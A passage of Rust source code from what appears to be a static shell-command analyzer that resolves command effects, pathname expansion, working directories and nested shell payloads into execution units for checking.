            && parsed.unset_commands.is_empty()
            && parsed.commands.iter().all(|command| {
                !command.guarded
                    && !command.conditional_execution
                    && command.control_flow_span.is_none()
                    && command.terminator.is_none()
                    && command.prefix_assignments.is_empty()
            })
            && caushell_parse::parse_command_substitutions(&parsed.raw_command, parsed.shell_kind)
                .is_ok_and(|items| items.is_empty())
    };
    let read_only = |parsed: &caushell_parse::ParsedCommandArtifact, skip: Option<usize>| {
        let observed = source_scope_observations(
            registry,
            request,
            parsed,
            parsed.commands.len().saturating_sub(1),
            &scope.bindings,
        );
        !observed.is_empty()
            && observed.len() == parsed.commands.len()
            && observed.iter().zip(&parsed.commands).enumerate().all(
                |(index, ((result, bindings), command))| {
                    let Some(name) = command.command_name.as_deref() else {
                        return false;
                    };
                    let ResolveInvocationArtifactResult::Resolved(invocation) = result else {
                        return false;
                    };
                    if name != invocation.normalized_command_name
                        || bindings.profile_has_alias_shadow(name)
                        || bindings.function_binding(name).is_some()
                    {
                        return false;
                    }
                    if skip == Some(index) {
                        return true;
                    }
                    let bound = &invocation.bound;
                    let Some(profile) =
                        registry.lookup(&invocation.normalized_command_name).profile
                    else {
                        return false;
                    };
                    profile.trust.source == caushell_profile::ProfileSourceKind::BuiltIn
                        && profile.argument_files.is_empty()
                        && profile.environment_inputs.is_empty()
                        && profile.option_environment.is_none()
                        && profile.implicit_config_files.is_empty()
                        && profile.configuration_files.is_none()
                        && profile.native_configuration.is_none()
                        && !bound.operation_semantics_unresolved
                        && bound.residuals.is_empty()
                        && bound.configured_inputs.is_empty()
                        && bound.configured_execution_sources.is_empty()
                        && bound.argument_regions.is_empty()
                    && bound.payload_projections.iter().all(|projection| {
                        projection.format == caushell_profile::PayloadFormat::SedProgram
                            && matches!(&projection.source,
                                caushell_profile::PayloadInputSource::Slot(_))
                    })
                        && bound.native_argv_effect_envelope.is_none()
                    && bound.effects.iter().all(|effect| {
                        super::symbolic_native_inputs::read_effect(effect)
                            || (effect.resource_namespace.is_none()
                                && matches!(&effect.target, EffectTarget::Slot(slot)
                                    if bound.payload_projections.iter().any(|projection| {
                                        slot == &projection.writes
                                            || slot == &projection.deletes
                                            || projection.executions.as_ref() == Some(slot)
                                    }))
                                && crate::path::path_target_is_inapplicable(bound, &effect.target))
                    })
                },
            )
    };
    simple(outer)
        && read_only(outer, None)
        && simple(current)
        && read_only(current, Some(current_index))
        && substitutions
            .iter()
            .filter(|sub| sub.body_text != current.raw_command)
            .all(|sub| {
                caushell_parse::parse_command(&sub.body_text, outer.shell_kind)
                    .is_ok_and(|body| simple(&body) && read_only(&body, None))
            })
}

fn static_entry_find_pathname<'a>(
    registry: &ProfileRegistry,
    ctx: &RunnerContext,
    entry: &ExpandedFrontierEntry,
    command: &'a caushell_parse::CommandFact,
    cwd: &caushell_runner::EffectiveCwd,
) -> Option<(caushell_parse::CommandFact, &'a caushell_parse::CommandSubstitutionFact)> {
    let cwd = cwd.as_known()?;
    if command.command_name.as_deref() != Some("find")
        || cwd != ctx.request().shell_state_before.cwd()
        || !registry.lookup("find").profile.is_some_and(|profile| {
            profile.trust.source == caushell_profile::ProfileSourceKind::BuiltIn
        })
    {
        return None;
    }
    let token = command.tokens.first()?;
    let producer = static_entry_pwd_producer(registry, ctx, entry, command)?;
    if token.command_substitutions.as_slice() != std::slice::from_ref(producer) {
        return None;
    }
    let source = ctx.request().command.get(token.span.start_byte..token.span.end_byte)?;
    let (suffix, quoted_prefix) = if let Some(suffix) = source.strip_prefix(&producer.text) {
        (suffix, false)
    } else {
        (source.strip_prefix('"')?.strip_prefix(&producer.text)?.strip_prefix('"')?, true)
    };
    let literal_path_byte = |b: u8| b.is_ascii_alphanumeric() || matches!(b, b'/' | b'.' | b'_' | b'-');
    if !cwd.bytes().all(literal_path_byte)
        || !suffix.starts_with('/')
        || !suffix.contains('*')
        || suffix.contains("**")
        || !suffix.bytes().all(|b| b == b'*' || literal_path_byte(b))
        || (!quoted_prefix && caushell_profile::observed_ifs_value(&entry.bindings)
            .is_none_or(|ifs| cwd.chars().any(|c| ifs.contains(c))))
    {
        return None;
    }

    // This internal argument retains the wildcard and the original span.
    // The original parsed scope still supplies the producer and child audit.
    let mut pathname_command = command.clone();
    let token = pathname_command.tokens.first_mut()?;
    token.text = format!("{cwd}{suffix}");
    token.quoted = false;
    token.node_kind = "word".into();
    token.command_substitutions.clear();
    Some((pathname_command, producer))
}

fn materialize_pathname_fields(
    registry: &ProfileRegistry,
    request: &CheckRequest,
    entry: &mut ExpandedFrontierEntry,
    context: &ProgramSourceContext,
    ctx: &mut RunnerContext,
) {
    entry.bindings.set_pathname_fields(Vec::new());
    let ResolveInvocationArtifactResult::Resolved(resolved) = &entry.result else {
        return;
    };
    if !resolved.projection.args.iter().any(|arg| {
        !matches!(
            caushell_profile::PathnamePattern::from_argument(arg, entry.shell_kind),
            Ok(None)
        )
    }) {
        return;
    }
    let index = program_command_index(entry);
    let observations = source_scope_observations(
        registry,
        request,
        &entry.parsed_scope,
        index,
        program_scope_bindings(entry),
    );
    let cwd = super::compute_effective_cwd::source_scope_execution_cwds(
        &entry.parsed_scope,
        request,
        &context.entry_cwd,
        &observations,
    )
    .0
    .get(index)
    .cloned()
    .unwrap_or(caushell_runner::EffectiveCwd::Unknown);
    let Some(source_command) = entry.parsed_scope.commands.get(entry.command_ref.command_index) else {
        return;
    };
    let runtime_context = runtime_context_for_parsed_command(
        &entry.parsed_scope,
        entry.command_ref.command_index,
        source_command,
    );
    let pathname = static_entry_find_pathname(registry, ctx, entry, source_command, &cwd)
        .and_then(|(command, producer)| {
            let ResolveInvocationArtifactResult::Resolved(rebound) = resolve_invocation_artifact_with_bindings(
                registry, &command, runtime_context.clone(), &entry.bindings,
            ) else {
                return None;
            };
            rebound.bound.bound_parameters.iter().any(|parameter| {
                parameter.name.as_str() == "search_roots" && parameter.values.iter().any(|value| {
                    matches!(value, BoundValue::Argument { text, ownership: caushell_profile::ArgumentOwnership::Operand, .. }
                        if text == &command.tokens[0].text)
                })
            }).then_some((command, rebound, producer))
        });
    let mut frame = pathname_scope_is_stable(
        registry,
        request,
        &entry.parsed_scope,
        index,
        program_scope_bindings(entry),
        pathname.as_ref().map(|(_, _, producer)| *producer),
    );
    // A directory-only glob requires evidence about directory membership,
    // including symlinks followed by a trailing slash.
    let process_parent_proved = entry.origin_kind == ExecutionUnitOriginKind::ProcessSubstitutionBody
        && entry.bindings.pathname_options().is_none()
        && resolved.projection.args.iter().all(|arg| {
            match caushell_profile::PathnamePattern::from_argument(arg, entry.shell_kind) {
                Ok(Some(pattern)) => !pattern.absolute && pattern.components.len() == 2
                    && pattern.literal.ends_with('/'),
                Ok(None) => true,
                Err(_) => false,
            }
        })
        && matches!(&context.source_scopes[..], [scope]
            if read_only_process_substitution_parent(registry, request, scope,
                &entry.parsed_scope, index));
    for scope in &context.source_scopes {
        if process_parent_proved {
            continue;
        }
        frame = frame.and_then(|writes_after_expansion| {
            pathname_scope_is_stable(
                registry,
                request,
                &scope.parsed,
                scope.before_command_index,
                &scope.bindings,
                None,
            )
            .map(|_| writes_after_expansion)
        });
    }
    if entry.inherited_scope.static_input_cwd_unproven
        || entry.bindings.shell_state_uncertainty().is_some()
    {
        frame = Err("pathname execution frame is incomplete".into());
    }
    let pathname = pathname.as_ref().filter(|_| frame.is_ok());
    let (command, resolved) = pathname.map_or((source_command, resolved), |(command, rebound, _)| {
        (command, rebound)
    });
    let writes_after_expansion = frame.as_ref().is_ok_and(|value| *value);
    let mut proofs = super::pathname_fields::observe(
        ctx,
        &entry.source_node_id.0,
        &resolved.projection.args,
        &entry.bindings,
        entry.shell_kind,
        &cwd,
        frame.map(|_| ()),
        resolved.bound.operation_semantics_unresolved || !resolved.bound.residuals.is_empty(),
    );
    if proofs.is_empty() {
        return;
    }
    let envelope = if (entry.origin_kind == ExecutionUnitOriginKind::TopLevel || process_parent_proved)
        && proofs.iter().all(|proof| {
            proof.unmatched_literal.is_some() || proof.single_match_bound.is_some()
        })
    {
        super::pathname_fields::possible_pathname_effects(
            registry,
            &entry.parsed_scope,
            command,
            runtime_context.clone(),
            &entry.bindings,
            resolved,
            &mut proofs,
            ctx,
            writes_after_expansion,
        )
        .filter(|candidate| !process_parent_proved
            || candidate.bound.effects.iter().all(super::symbolic_native_inputs::read_effect))
    } else {
        None
    };
    if envelope.is_some() {
        for proof in &mut proofs {
            proof.exact_fields_required = false;
            proof.gap = None;
        }
    }
    for proof in &proofs {
        let derived = pathname.is_some() && proof.start_byte == command.tokens[0].span.start_byte;
        let mut shown = proof.clone();
        if derived {
            shown.source_word.clone_from(&source_command.tokens[0].text);
        }
        let mut evidence = super::pathname_fields::evidence(shown);
        if derived {
            evidence.summary = "shell pathname fields with a proven Bash directory prefix".into();
        }
        ctx.add_evidence(evidence);
    }
    entry.bindings.set_pathname_fields(proofs);
    entry.result = match envelope {
        Some(resolved) => ResolveInvocationArtifactResult::Resolved(resolved),
        None => resolve_invocation_artifact_with_bindings(
            registry, command, runtime_context, &entry.bindings,
        ),
    };
}

fn program_command_index(entry: &ExpandedFrontierEntry) -> usize {
    if entry.origin_kind == ExecutionUnitOriginKind::Dispatch {
        0
    } else {
        entry.command_ref.command_index
    }
}

/// New execution scopes inherit source visibility and cwd, not the native
/// launcher's stdin or synthetic argv byte coordinates.
fn inherit_program_source_contexts(
    registry: &ProfileRegistry,
    request: &CheckRequest,
    parent: &ExpandedFrontierEntry,
    context: &ProgramSourceContext,
    children: &[ExpandedFrontierEntry],
    contexts: &mut BTreeMap<caushell_graph::NodeId, ProgramSourceContext>,
) {
    if !children.iter().any(|child| {
        !contexts.contains_key(&child.source_node_id)
            && child.parent_execution_node_id == parent.source_node_id
    }) {
        return;
    }
    let observations = source_scope_observations(
        registry,
        request,
        &parent.parsed_scope,
        program_command_index(parent),
        program_scope_bindings(parent),
    );
    let shell_cwd = super::compute_effective_cwd::source_scope_execution_cwds(
        &parent.parsed_scope,
        request,
        &context.entry_cwd,
        &observations,
    )
    .0
    .get(program_command_index(parent))
    .cloned()
    .unwrap_or(caushell_runner::EffectiveCwd::Unknown);
    let execution_cwd = match &parent.result {
        ResolveInvocationArtifactResult::Resolved(resolved) => {
            super::compute_effective_cwd::source_invocation_execution_cwd(
                &resolved.bound,
                &shell_cwd,
                &parent.bindings,
                request.home.as_deref(),
            )
        }
        _ => shell_cwd,
    };
    for child in children {
        if contexts.contains_key(&child.source_node_id) {
            continue;
        }
        if child.parent_execution_node_id != parent.source_node_id {
            // Assignment producers can return another scope's descendants.
            // Their source anchor is not the containing invocation's entry.
            continue;
        }
        let child_context = if child.parsed_scope == parent.parsed_scope
            && child.origin_kind != ExecutionUnitOriginKind::Dispatch
        {
            context.clone()
        } else {
            let entry_cwd = if child.origin_kind == ExecutionUnitOriginKind::Dispatch {
                super::compute_effective_cwd::source_dispatch_entry_cwd(
                    child.inherited_scope.dispatch_working_directory.as_ref(),
                    &execution_cwd,
                    match &parent.result {
                        ResolveInvocationArtifactResult::Resolved(r) => Some(&r.bound),
                        _ => None,
                    },
                    parent
                        .bindings
                        .tilde_home_with_default(request.home.as_deref()),
                )
            } else {
                execution_cwd.clone()
            };
            ProgramSourceContext {
                entry_cwd,
                source_scopes: extended_payload_source_scopes(
                    &context.source_scopes,
                    &parent.parsed_scope,
                    program_command_index(parent),
                    program_scope_bindings(parent),
                    &context.entry_cwd,
                ),
            }
        };
        contexts.insert(child.source_node_id.clone(), child_context);
    }
}

fn expanded_config_program_children(
    registry: &ProfileRegistry,
    ctx: &mut RunnerContext,
    session: SessionView<'_>,
    request: &CheckRequest,
    entry: &ExpandedFrontierEntry,
    resolved: &caushell_profile::ResolvedInvocationArtifact,
    context: &ProgramSourceContext,
    max_depth: u8,
    first_payload_id: usize,
    payloads: &mut Vec<NestedPayloadRecord>,
    syntax_scopes: &mut Vec<caushell_runner::ShellRedirectionScope>,
    contexts: &mut BTreeMap<caushell_graph::NodeId, ProgramSourceContext>,
) -> Vec<ExpandedFrontierEntry> {
    let parent_ref = if entry.origin_kind == ExecutionUnitOriginKind::TopLevel {
        NestedPayloadParentRef::RootCommand {
            command_index: entry.command_ref.command_index,
        }
    } else {
        NestedPayloadParentRef::DerivedInvocation {
            node_id: entry.source_node_id.clone(),
        }
    };
    let mut candidates =
        git::frontier_entries(registry, session, request, entry, resolved, context, ctx);
    candidates.extend(config_defined_task_frontier_entries(
        registry,
        session,
        request,
        &entry.parsed_scope,
        program_command_index(entry),
        &resolved.bound,
        &entry.bindings,
        program_scope_bindings(entry),
        &context.entry_cwd,
        &context.source_scopes,
        parent_ref,
        entry.root_command_index,
        entry.depth.saturating_add(1),
    ));
    let mut children = Vec::new();
    for payload in candidates.into_iter().rev() {
        let materialized = materialize_frontier_entry(&payload);
        let id = NestedPayloadRecordId(first_payload_id + payloads.len());
        let bindings = payload
            .positional_args
            .as_deref()
            .map(|args| shell_payload_session_bindings(&payload.bindings, args))
            .unwrap_or_else(|| payload.bindings.clone());
        let static_input = matches!(
            materialized.resolution,
            ValueMaterialization::Static
                | ValueMaterialization::ResolvedExactScalar { .. }
                | ValueMaterialization::ResolvedRuntimeProduced { .. }
                | ValueMaterialization::ResolvedShellWord { .. }
        );
        let mut record = if static_input && payload.depth <= max_depth {
            let parsed = parse_recursive_payload_candidate(&materialized.candidate);
            NestedPayloadRecord::from_parse_result(
                id,
                payload.parent_ref,
                payload.root_command_index,
                payload.depth,
                bindings.clone(),
                materialized,
                parsed,
            )
        } else {
            let resolution = if payload.depth > max_depth {
                NestedPayloadResolution::TruncatedByDepthBudget {
                    max_depth,
                    next_candidate_count: 1,
                }
            } else {
                NestedPayloadResolution::from_unresolved_materialization(
                    materialized.resolution.clone(),
                )
            };
            NestedPayloadRecord {
                record_id: id,
                parent_ref: payload.parent_ref,
                root_command_index: payload.root_command_index,
                depth: payload.depth,
                bindings: bindings.clone(),
                candidate: materialized,
                resolution,
                execution_cwd: None,
            }
        };
        record.execution_cwd = Some(payload.scope_entry_cwd.clone());
        if let NestedPayloadResolution::Parsed { shell_kind, parsed } = &mut record.resolution {
            if let Some(args) = payload.positional_args.as_deref() {
                bind_shell_positional_arguments(parsed, args);
            }
            let parent_node =
                nested_payload_node_id(&request.session_id, request.sequence_no, id.0);
            if parsed.commands.is_empty() {
                register_shell_redirection_scope(
                    registry,
                    request,
                    syntax_scopes,
                    parsed,
                    &bindings,
                    parent_node.clone(),
                    None,
                    ExecutionUnitOriginKind::NestedPayload,
                    ExecutionUnitOriginLocator::None,
                    payload.depth,
                    entry.root_command_index,
                    false,
                    max_depth,
                );
            }
            for (index, command) in parsed.commands.iter().enumerate() {
                let command_bindings = apply_runtime_variable_bindings_before_span(
                    registry,
                    request,
                    bindings.clone(),
                    parsed,
                    command.span.start_byte,
                    request.sequence_no,
                );
                let node = derived_invocation_node_id(
                    &request.session_id,
                    request.sequence_no,
                    id.0,
                    index,
                );
                contexts.insert(
                    node.clone(),
                    ProgramSourceContext {
                        entry_cwd: payload.scope_entry_cwd.clone(),
                        source_scopes: payload.source_scopes.clone(),
                    },
                );
                children.push(ExpandedFrontierEntry {
                    source_node_id: node,
                    command_ref: ParsedCommandRef::new(index, command.span.clone()),
                    parsed_scope: parsed.clone(),
                    rendered_command_text: command.text.clone(),
                    result: resolve_invocation_artifact_with_bindings(
                        registry,
                        command,
                        runtime_context_for_parsed_command(parsed, index, command),
                        &command_bindings,
                    ),
                    shell_kind: *shell_kind,
                    root_command_index: entry.root_command_index,
                    depth: payload.depth,
                    parent_execution_node_id: parent_node.clone(),
                    bindings: command_bindings.clone(),
                    static_payload_scope: StaticPayloadLookupScope {
                        parsed_scope: parsed.clone(),
                        command_index: index,
                        bindings: command_bindings,
                        scope_base_bindings: bindings.clone(),
                        stdin_is_parent_output: false,
                    },
                    history_anchor_node_id: entry.history_anchor_node_id.clone(),
                    origin_kind: ExecutionUnitOriginKind::NestedPayload,
                    origin_index: index,
                    origin_locator: ExecutionUnitOriginLocator::None,
                    inherited_scope: entry.inherited_scope.clone(),
                });
            }
            children.extend(
                expanded_assignment_command_substitution_body_children_for_scope(
                    syntax_scopes,
                    registry,
                    request,
                    parsed,
                    *shell_kind,
                    &parent_node,
                    &entry.history_anchor_node_id,
                    entry.root_command_index,
                    payload.depth.saturating_add(1),
                    &bindings,
                    &entry.inherited_scope,
                    None,
                    Some("config-program"),
                    children
                        .iter()
                        .find(|child| child.parent_execution_node_id == parent_node)
                        .map(|child| AssignmentCwdSource::RecordScope(&child.source_node_id))
                        .unwrap_or(AssignmentCwdSource::InvocationEntry),
                    max_depth,
                ),
            );
        }
        payloads.push(record);
    }
    children
}

/// A single opt-in gate for top-level and expanded executions. Data formats do
/// not become recursive shell payloads, and no command-name special case lives here.
fn refresh_execution_payload_projections(
    registry: &ProfileRegistry,

    session: SessionView<'_>,
    request: &CheckRequest,
    entry: &mut ExpandedFrontierEntry,
    max_nested_parse_depth: u8,
    observed_stdin: Option<&str>,
) {
    let ResolveInvocationArtifactResult::Resolved(resolved) = &entry.result else {
        return;
    };
    let Some(max_bytes) = resolved
        .bound
        .payload_projections
        .iter()
        .filter(|p| p.may_read_stdin())
        .map(|p| p.max_bytes)
        .max()
    else {
        return;
    };
    if let Some(payload) = observed_stdin {
        if let ResolveInvocationArtifactResult::Resolved(resolved) = &mut entry.result {
            caushell_profile::refresh_payload_projections(
                &mut resolved.bound,
                (payload.len() <= max_bytes).then_some(payload),
            );
        }
        return;
    }
    if entry.static_payload_scope.stdin_is_parent_output {
        if let ResolveInvocationArtifactResult::Resolved(resolved) = &mut entry.result {
            caushell_profile::refresh_payload_projections(&mut resolved.bound, None);
        }
        return;
    }
    let cwd = request.shell_state_before.cwd();
    let reliable = !entry.inherited_scope.static_input_cwd_unproven;
    let evidence = static_stdin_evidence_for_scoped_command(
        caushell_query::QuerySession::from_session(&session),
        &entry.static_payload_scope.parsed_scope,
        entry.static_payload_scope.command_index,
        request.sequence_no,
        &runtime_binding_replay(registry, request, &entry.static_payload_scope.bindings),
        &runtime_binding_replay(
            registry,
            request,
            &entry.static_payload_scope.scope_base_bindings,
        ),
        cwd,
        reliable,
        request.home.as_deref(),
        max_nested_parse_depth.saturating_sub(entry.depth),
    );
    // Partial fragments are not a complete protocol, even if they contain end markers.
    let payload = (evidence.complete
        && evidence
            .known_fragments
            .iter()
            .try_fold(0usize, |n, s| n.checked_add(s.len()))
            .is_some_and(|n| n <= max_bytes))
    .then(|| evidence.known_fragments.concat());
    if let ResolveInvocationArtifactResult::Resolved(resolved) = &mut entry.result {
        caushell_profile::refresh_payload_projections(&mut resolved.bound, payload.as_deref());
    }
}

fn collect_execution_unit_resolve_records(
    registry: &ProfileRegistry,
    session: SessionView<'_>,
    request: &CheckRequest,
    parsed_request: &caushell_parse::ParsedCommandArtifact,
    top_level_records: &[ResolvedCommandSeed],
    function_derived_commands: &[TopLevelFunctionDerivedCommand],
    function_derived_records: &[ResolvedCommandSeed],
    function_scopes: &[TopLevelFunctionScope],
    dispatch_derived_commands: &[TopLevelDispatchDerivedCommand],
    dispatch_derived_records: &[ResolvedCommandSeed],
    nested_payload_records: &[NestedPayloadRecord],
    payload_source_contexts: &BTreeMap<caushell_graph::NodeId, ProgramSourceContext>,
    max_nested_parse_depth: u8,
    observed: &mut super::observed_native_inputs::ObservedInputs,
    pathname_context: &mut RunnerContext,
) -> (
    Vec<ExecutionUnitResolveRecord>,
    Vec<Evidence>,
    Vec<NestedPayloadRecord>,
    Vec<caushell_runner::ShellRedirectionScope>,
    std::collections::BTreeSet<usize>,
    BTreeMap<caushell_graph::NodeId, String>,
) {
    let mut records = Vec::new();
    let mut syntax_scopes = Vec::new();
    let mut expansion_limit_evidence = Vec::new();
    let mut symbolic_xargs_arity_budget = 32usize;
    let mut derived_payloads = Vec::new();
    let mut canonical_inline_payload_ids = std::collections::BTreeSet::new();
    let mut expanded_function_calls = BTreeMap::new();
    let first_payload_id = nested_payload_records
        .iter()
        .map(|r| r.record_id.0)
        .max()
        .map_or(0, |id| id + 1);
    let mut frontier = Vec::new();

    let request_scope_base_bindings = request_bindings(session.summary(), request);
    let request_cwd = caushell_runner::EffectiveCwd::known(request.shell_state_before.cwd());
    let mut program_contexts = BTreeMap::new();
    register_shell_redirection_scope(
        registry,
        request,
        &mut syntax_scopes,
        parsed_request,
        &request_scope_base_bindings,
        caushell_runner::request_anchor_node_id(request),
        None,
        ExecutionUnitOriginKind::TopLevel,
        ExecutionUnitOriginLocator::None,
        0,
        0,
        true,
        max_nested_parse_depth,
    );
    for scope in function_scopes
        .iter()
        .filter(|s| s.parsed_body.commands.is_empty())
    {
        register_shell_redirection_scope(
            registry,
            request,
            &mut syntax_scopes,
            &scope.parsed_body,
            &scope.bindings,
            scope.parent_node_id.clone(),
            None,
            ExecutionUnitOriginKind::FunctionExpansion,
            ExecutionUnitOriginLocator::FunctionExpansion {
                function_name: scope.function_name.clone(),
            },
            1,
            scope.source_command_index,
            false,
            max_nested_parse_depth,
        );
    }

    for record in top_level_records {
        let Some(command) = parsed_request
            .commands
            .get(record.command_ref.command_index)
        else {
            continue;
        };
        let command_bindings = runtime_source_bindings_before_span(
            registry,
            caushell_query::QuerySession::new(session.graph(), session.summary()),
            request,
            parsed_request,
            command.span.start_byte,
        );
        program_contexts.insert(
            record.source_node_id.clone(),
            ProgramSourceContext {
                entry_cwd: request_cwd.clone(),
                source_scopes: Vec::new(),
            },
        );
        frontier.push(ExpandedFrontierEntry {
            source_node_id: record.source_node_id.clone(),
            command_ref: record.command_ref.clone(),
            parsed_scope: parsed_request.clone(),
            rendered_command_text: command.text.clone(),
            result: record.result.clone(),
            shell_kind: request.shell_kind,
            root_command_index: top_level_unit_for_command(
                parsed_request,
                record.command_ref.command_index,
            )
            .map(|unit| unit.unit_index)
            .unwrap_or(record.command_ref.command_index),
            depth: 0,
            parent_execution_node_id: record.source_node_id.clone(),
            bindings: command_bindings.clone(),
            static_payload_scope: StaticPayloadLookupScope {
                parsed_scope: parsed_request.clone(),
                command_index: record.command_ref.command_index,
                bindings: command_bindings,
                scope_base_bindings: request_scope_base_bindings.clone(),
                stdin_is_parent_output: false,
            },
            history_anchor_node_id: record.source_node_id.clone(),
            origin_kind: ExecutionUnitOriginKind::TopLevel,
            origin_index: record.command_ref.command_index,
            origin_locator: ExecutionUnitOriginLocator::None,
            inherited_scope: ExecutionUnitInheritedScope::default(),
        });
    }

    for (command, record) in function_derived_commands
        .iter()
        .zip(function_derived_records.iter())
    {
        program_contexts.insert(
            record.source_node_id.clone(),
            ProgramSourceContext {
                entry_cwd: source_payload_cwd(
                    registry,
                    request,
                    parsed_request,
                    command.source_command_index,
                    &request_scope_base_bindings,
                    &request_cwd,
                ),
                source_scopes: extended_payload_source_scopes(
                    &[],
                    parsed_request,
                    command.source_command_index,
                    &request_scope_base_bindings,
                    &request_cwd,
                ),
            },
        );
        frontier.push(ExpandedFrontierEntry {
            source_node_id: record.source_node_id.clone(),
            command_ref: record.command_ref.clone(),
            parsed_scope: command.parsed_body.clone(),
            rendered_command_text: command.command.text.clone(),
            result: record.result.clone(),
            shell_kind: request.shell_kind,
            root_command_index: command.source_command_index,
            depth: 1,
            parent_execution_node_id: command.parent_node_id.clone(),
            bindings: command.bindings.clone(),
            static_payload_scope: StaticPayloadLookupScope {
                parsed_scope: command.parsed_body.clone(),
                command_index: record.command_ref.command_index,
                bindings: command.bindings.clone(),
                scope_base_bindings: command.scope_base_bindings.clone(),
                stdin_is_parent_output: false,
            },
            history_anchor_node_id: command.parent_node_id.clone(),
            origin_kind: ExecutionUnitOriginKind::FunctionExpansion,
            origin_index: record.command_ref.command_index,
            origin_locator: ExecutionUnitOriginLocator::None,
            inherited_scope: ExecutionUnitInheritedScope::default(),
        });
    }

    for scope in function_scopes {
        let call = &parsed_request.commands[scope.source_command_index];
        let call_cwd = caushell_runner::ShellSourceCwdAnchor::RequestPosition {
            start_byte: call.span.start_byte,
        };
        let body_scope_node = (!scope.parsed_body.commands.is_empty()).then(|| {
            function_derived_invocation_node_id(
                &request.session_id,
                request.sequence_no,
                scope.source_command_index,
                0,
            )
        });
        frontier.extend(
            expanded_assignment_command_substitution_body_children_for_scope(
                &mut syntax_scopes,
                registry,
                request,
                &scope.parsed_body,
                request.shell_kind,
                &scope.parent_node_id,
                &scope.parent_node_id,
                scope.source_command_index,
                2,
                &scope.bindings,
                &ExecutionUnitInheritedScope::default(),
                None,
                Some("function-scope"),
                body_scope_node
                    .as_ref()
                    .map(AssignmentCwdSource::RecordScope)
                    .unwrap_or(AssignmentCwdSource::Fixed(&call_cwd)),
                max_nested_parse_depth,
            ),
        );
        // Argument expansions execute before a known function too. They are
        // owned by the call site, not by whichever commands its body contains.
        // Cheap syntax-only trigger: literals may cause extra analysis, never
        // new effects. Ordinary function calls need no extra scope clones.
        let expanded_call = &scope.call_command;
        if !expanded_call.text.contains("$(")
            && !expanded_call.text.contains('`')
            && !expanded_call.text.contains("<(")
            && !expanded_call.text.contains(">(")
        {
            continue;
        }
        let mut call_scope = parsed_request.clone();
        call_scope.commands[scope.source_command_index] = expanded_call.clone();
        let call_entry = ExpandedFrontierEntry {
            source_node_id: scope.parent_node_id.clone(),
            command_ref: ParsedCommandRef::new(
                scope.source_command_index,
                expanded_call.span.clone(),
            ),
            parsed_scope: call_scope.clone(),
            rendered_command_text: expanded_call.text.clone(),
            // This query-only call entry is never staged as an unresolved
            // external executable; the known body owns function semantics.
            result: ResolveInvocationArtifactResult::NoProfile {
                normalized_command_name: scope.function_name.clone(),
                gap_kind: caushell_types::ResolveGapKind::NoProfile,
                executable_word: None,
            },
            shell_kind: request.shell_kind,
            root_command_index: scope.source_command_index,
            depth: 0,
            parent_execution_node_id: scope.parent_node_id.clone(),
            bindings: scope.call_bindings.clone(),
            static_payload_scope: StaticPayloadLookupScope {
                parsed_scope: call_scope,
                command_index: scope.source_command_index,
                bindings: scope.call_bindings.clone(),
                scope_base_bindings: request_scope_base_bindings.clone(),
                stdin_is_parent_output: false,
            },
            history_anchor_node_id: scope.parent_node_id.clone(),
            origin_kind: ExecutionUnitOriginKind::TopLevel,
            origin_index: scope.source_command_index,
            origin_locator: ExecutionUnitOriginLocator::None,
            inherited_scope: ExecutionUnitInheritedScope::default(),
        };
        frontier.extend(expanded_command_substitution_body_children(
            &mut syntax_scopes,
            registry,
            request,
            &call_entry,
            max_nested_parse_depth,
        ));
        frontier.extend(expanded_process_substitution_body_children(
            &mut syntax_scopes,
            registry,
            request,
            &call_entry,
            None,
            max_nested_parse_depth,
        ));
    }

    for record in nested_payload_records {
        if nested_payload_is_inline_shell_child(
            registry,
            session,
            request,
            record,
            parsed_request,
            top_level_records,
            function_derived_commands,
            function_derived_records,
            dispatch_derived_commands,
            dispatch_derived_records,
            nested_payload_records,
        ) {
            canonical_inline_payload_ids.insert(record.record_id.0);
            continue;
        }
        let NestedPayloadResolution::Parsed { shell_kind, parsed } = &record.resolution else {
            continue;
        };

        if parsed.commands.is_empty() {
            let parent = match &record.parent_ref {
                NestedPayloadParentRef::DerivedInvocation { node_id } => node_id.clone(),
                NestedPayloadParentRef::RootCommand { command_index } => top_level_records
                    .iter()
                    .find(|r| r.command_ref.command_index == *command_index)
                    .map(|r| r.source_node_id.clone())
                    .unwrap_or_else(|| caushell_runner::request_anchor_node_id(request)),
            };
            register_shell_redirection_scope(
                registry,
                request,
                &mut syntax_scopes,
                parsed,
                &record.bindings,
                parent,
                None,
                ExecutionUnitOriginKind::NestedPayload,
                ExecutionUnitOriginLocator::None,
                record.depth,
                record.root_command_index,
                false,
                max_nested_parse_depth,
            );
        }

        for (derived_command_index, command) in parsed.commands.iter().enumerate() {
            let source_node_id = derived_invocation_node_id(
                &request.session_id,
                request.sequence_no,
                record.record_id.0,
                derived_command_index,
            );
            let command_bindings = apply_runtime_variable_bindings_before_span(
                registry,
                request,
                record.bindings.clone(),
                parsed,
                command.span.start_byte,
                request.sequence_no,
            );
            let resolved = resolve_invocation_artifact_with_bindings(
                registry,
                command,
                runtime_context_for_parsed_command(parsed, derived_command_index, command),
                &command_bindings,
            );
            let parent_execution_node_id = nested_payload_node_id(
                &request.session_id,
                request.sequence_no,
                record.record_id.0,
            );
            let history_anchor_node_id =
                nested_payload_history_anchor_node_id(request, parsed_request, record);
            frontier.push(ExpandedFrontierEntry {
                source_node_id,
                command_ref: ParsedCommandRef::new(derived_command_index, command.span.clone()),
                parsed_scope: parsed.clone(),
                rendered_command_text: command.text.clone(),
                result: resolved,
                shell_kind: *shell_kind,
                root_command_index: record.root_command_index,
                depth: record.depth,
                parent_execution_node_id: parent_execution_node_id.clone(),
                bindings: command_bindings.clone(),
                static_payload_scope: StaticPayloadLookupScope {
                    parsed_scope: parsed.clone(),
                    command_index: derived_command_index,
                    bindings: command_bindings,
                    scope_base_bindings: record.bindings.clone(),
                    stdin_is_parent_output: false,
                },
                history_anchor_node_id,
                origin_kind: ExecutionUnitOriginKind::NestedPayload,
                origin_index: derived_command_index,
                origin_locator: ExecutionUnitOriginLocator::None,
                inherited_scope: ExecutionUnitInheritedScope::default(),
            });
            program_contexts.insert(
                derived_invocation_node_id(
                    &request.session_id,
                    request.sequence_no,
                    record.record_id.0,
                    derived_command_index,
                ),
                payload_source_contexts
                    .get(&parent_execution_node_id)
                    .cloned()
                    .unwrap_or_default(),
            );
        }
    }

    let mut legacy_payload_sources: std::collections::BTreeSet<_> = frontier
        .iter()
        .filter(|entry| {
            matches!(
                entry.origin_kind,
                ExecutionUnitOriginKind::TopLevel
                    | ExecutionUnitOriginKind::FunctionExpansion
                    | ExecutionUnitOriginKind::NestedPayload
            )
        })
        .map(|entry| entry.source_node_id.clone())
        .collect();
    legacy_payload_sources.extend(
